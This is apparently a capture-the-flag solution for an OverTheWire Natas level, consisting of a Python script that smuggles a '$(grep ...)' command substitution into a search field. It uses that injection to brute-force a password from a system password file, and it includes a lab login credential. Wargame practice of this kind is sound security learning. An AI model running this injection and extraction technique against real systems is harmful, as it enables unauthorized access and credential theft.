
---

$(command substitution)

```
import requests
import string

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

chars = string.ascii_letters + string.digits

password = ""

while len(password) < 32:
    for c in chars:
        payload = "$(grep ^" + password + c + " /etc/natas_webpass/natas17)apple"

        r = requests.post(
            url,
            auth = auth,
            data = {"needle": payload},
            timeout = 10
        )

        if "<pre>\n</pre>" in r.text:
            password += c
            print(password)
            break
```

`<pre>` means preformatted text.